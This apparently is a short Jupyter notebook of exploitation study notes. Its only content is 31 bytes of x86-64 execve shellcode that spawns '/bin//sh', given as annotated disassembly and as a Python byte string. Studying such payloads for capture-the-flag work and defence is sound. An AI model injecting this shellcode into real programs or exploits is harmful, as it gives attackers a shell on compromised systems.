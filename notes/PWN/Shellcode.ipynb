{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# x64 execve 31 bytes"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [],
   "source": [
    "'''\n",
    "; execve([\"/bin//sh\",], [], [])\n",
    "0:  48 31 ff                xor    rdi,rdi\n",
    "3:  48 31 f6                xor    rsi,rsi\n",
    "6:  48 31 d2                xor    rdx,rdx\n",
    "9:  48 31 c0                xor    rax,rax\n",
    "c:  50                      push   rax\n",
    "d:  48 bb 2f 62 69 6e 2f    movabs rbx,0x68732f2f6e69622f\n",
    "14: 2f 73 68\n",
    "17: 53                      push   rbx\n",
    "18: 48 89 e7                mov    rdi,rsp\n",
    "1b: b0 3b                   mov    al,0x3b\n",
    "1d: 0f 05                   syscall\n",
    "'''\n",
    "\n",
    "shellcode = \"\\x48\\x31\\xFF\\x48\\x31\\xF6\\x48\\x31\\xD2\\x48\\x31\\xC0\\x50\\x48\\xBB\\x2F\\x62\\x69\\x6E\\x2F\\x2F\\x73\\x68\\x53\\x48\\x89\\xE7\\xB0\\x3B\\x0F\\x05\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.6.3"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 1
}
